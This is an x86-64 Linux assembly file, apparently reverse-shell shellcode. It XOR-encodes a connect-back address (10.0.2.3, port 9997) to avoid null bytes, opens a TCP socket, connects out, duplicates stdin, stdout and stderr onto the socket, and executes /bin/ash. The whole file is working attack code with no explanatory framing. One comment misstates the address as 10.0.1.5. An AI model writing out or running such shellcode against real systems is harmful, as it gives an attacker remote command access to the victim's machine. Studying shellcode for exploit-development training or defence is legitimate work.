global _start

section .text
_start:
	; set the frame pointer
	mov rbp, rsp

	; clear required registers
	xor rax, rax
	xor rcx, rcx
	xor rdx, rdx

	; create sockaddr_in struct
	push rax						; [$rsp]: 8 bytes of padding
	mov eax, 0xffffffff
	mov ebx, 0xfcfdfff5				; 10.0.2.3
	;mov ebx, 0xfeffff80				; 127.0.0.1
	xor ebx, eax
	push rbx						; [$rsp]: 10.0.1.5
	push word 0x0d27				; [$rsp]: 9997
	push word 0x02					; [$rsp]: AF_INET

	; call socket(domain, type, protocol)
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	mov al, 0x29					; $rax: 0x29 / 41
	mov dil, 0x02					; $rdi: family = AF_INET
	mov sil, 0x01					; $rsi: type = SOCK_STREAM
	syscall
	mov rdi, rax					; $rdi: socket file descriptor

	; call connect(sockfd, sockaddr, sockLen_t)
	xor rax, rax
	mov al, 0x2a					; $rax: 0x2a / 42
	mov rsi, rsp					; $rsi: $rsp
	mov rdx, rbp
	sub rdx, rsp					; %rdx: sockLen_t
	syscall

	; call dup2 to redirect STDIN, STDOUT and STDERR
	xor rcx, rcx
	mov cl, 0x03
	mov rsi, rcx
dup:
	xor rax, rax
	mov al, 0x21					; $rax: 0x21 / 33
	dec rsi
	syscall
	mov rcx, rsi
	inc rcx
	loop dup

	; spawn /bin/ash using execve
	; $rcx and rsi are 0 at this point
	xor rax, rax
	xor rdx, rdx
	push rax
	push dword 0x6e69622f				; \bin
	mov dword [rsp+4], 0x6873612f			; \ash
	;mov dword [rsp+4], 0x68732f2f			; \\sh
	mov rdi, rsp					; [$rdi]: null terminated /bin/ash
	push rax
	push rdi
	mov rsi, rsp					; [$rsi]: arg array
	mov al, 0x3b					; $rax: 0x3b / 59
	syscall
